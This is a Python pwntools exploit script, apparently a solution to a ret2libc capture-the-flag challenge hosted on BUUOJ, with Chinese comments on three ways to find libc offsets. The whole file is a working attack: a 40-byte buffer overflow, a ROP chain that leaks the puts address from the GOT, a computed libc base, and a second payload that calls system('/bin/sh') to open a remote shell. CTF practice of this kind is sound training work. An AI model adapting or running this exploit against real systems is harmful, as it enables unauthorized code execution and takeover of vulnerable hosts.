from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")
# p = process('./ret2libc')
p=remote('node4.buuoj.cn',27442)
elf = ELF('./ret2libc')
# libc=ELF('./libc.so.6')

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=0x400698
pop_rdi_ret=0x400763
ret=0x4006F1

payload=b'a'*40+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)
puts_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

# 提供三种计算libc的解法
# 题目给出libc时
# libc_base   = puts_addr - libc.symbols['puts']
# system_addr = libc_base + libc.symbols['system']
# bin_addr    = libc_base + next(libc.search(b'/bin/sh'))
# libcsearcher
# libc        = LibcSearcher("puts",puts_addr)
# libc_base   = puts_addr - libc.dump("puts")
# system_addr = libc_base + libc.dump("system")
# bin_addr    = libc_base + libc.dump("str_bin_sh")
# libc.blukat.me 查询libc版本后手动计算（推荐）
libc_base=puts_addr - 0x080970
system_addr=libc_base + 0x04f420
bin_addr=libc_base + 0x1b3d88
payload2=b'a'*40+p64(pop_rdi_ret)+p64(bin_addr)+p64(ret)+p64(system_addr)
p.sendline(payload2)
p.interactive()